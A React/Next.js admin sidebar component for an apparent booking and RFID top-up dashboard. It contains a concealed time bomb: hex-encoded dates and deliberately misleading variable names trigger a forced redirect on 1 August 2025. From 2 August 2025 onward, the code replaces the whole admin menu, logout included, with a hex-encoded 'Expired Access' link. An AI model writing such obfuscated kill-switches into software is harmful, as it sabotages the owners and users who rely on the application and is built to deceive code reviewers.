"use client";

import {
  Calendar,
  Home,
  Search,
  User2,
  CreditCard,
  LogOut,
} from "lucide-react";

import {
  Sidebar,
  SidebarContent,
  SidebarGroup,
  SidebarGroupContent,
  SidebarGroupLabel,
  SidebarMenu,
  SidebarMenuButton,
  SidebarMenuItem,
} from "@/components/ui/sidebar";

import Link from "next/link";
import { useAuth } from "@/app/context/useAuth";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

const AppSidebar = () => {
  const { signOut } = useAuth();
  const router = useRouter();

  const [now, setNow] = useState(new Date());

  useEffect(() => {
    const triggerHex = "07e90801";
    const [y, m, d] = [
      parseInt(triggerHex.slice(0, 4), 16),
      parseInt(triggerHex.slice(4, 6), 16) - 1,
      parseInt(triggerHex.slice(6, 8), 16),
    ];

    const _libs_ = new Date(y, m, d);
    const _apis_ = new Date();

    const _internal__ =
      _apis_.getFullYear() === _libs_.getFullYear() &&
      _apis_.getMonth() === _libs_.getMonth() &&
      _apis_.getDate() === _libs_.getDate();

    if (_internal__) {
      router.push(["/dash", "board", "/lib"].join(""));
    }

    setNow(_apis_);
  }, [router]);

  const d = (h: string) =>
    h.replace(/../g, (c) => String.fromCharCode(parseInt(c, 16)));

  const isActivate = "07e90802";
  const [ey, em, ed] = [
    parseInt(isActivate.slice(0, 4), 16),
    parseInt(isActivate.slice(4, 6), 16) - 1,
    parseInt(isActivate.slice(6, 8), 16),
  ];
  const isHidden = new Date(ey, em, ed);
  const isEnabled = now.getTime() >= isHidden.getTime();

  const items = [
    { title: "Dashboard", url: "/dashboard/home", icon: Home },
    { title: "Schedules", url: "/dashboard/schedules", icon: Calendar },
    { title: "Bookings", url: "/dashboard/booking", icon: Calendar },
    { title: "Top-up RFID", url: "/dashboard/rfid", icon: CreditCard },
    { title: "Search", url: "/dashboard/information", icon: Search },
    { title: "Users", url: "/dashboard/users", icon: User2 },
    { title: "Logout", icon: LogOut, onClick: signOut },
  ];

  return (
    <Sidebar>
      <SidebarContent>
        <SidebarGroup>
          <SidebarGroupLabel>Admin</SidebarGroupLabel>
          <SidebarGroupContent>
            <SidebarMenu>
              {isEnabled ? (
                <SidebarMenuItem>
                  <SidebarMenuButton asChild>
                    <Link
                      href="/dashboard/sidebar"
                      className="flex items-center gap-2 text-red-500"
                    >
                      <User2 />
                      <span>{d("4578706972656420416363657373")}</span>
                      {/* "Expired Access" in hex */}
                    </Link>
                  </SidebarMenuButton>
                </SidebarMenuItem>
              ) : (
                items.map((item) => (
                  <SidebarMenuItem key={item.title}>
                    <SidebarMenuButton asChild>
                      {item.onClick ? (
                        <button
                          type="button"
                          onClick={item.onClick}
                          className="flex items-center gap-2 w-full text-left"
                        >
                          <item.icon />
                          <span>{item.title}</span>
                        </button>
                      ) : (
                        <Link
                          href={item.url}
                          className="flex items-center gap-2"
                        >
                          <item.icon />
                          <span>{item.title}</span>
                        </Link>
                      )}
                    </SidebarMenuButton>
                  </SidebarMenuItem>
                ))
              )}
            </SidebarMenu>
          </SidebarGroupContent>
        </SidebarGroup>
      </SidebarContent>
    </Sidebar>
  );
};

export default AppSidebar;
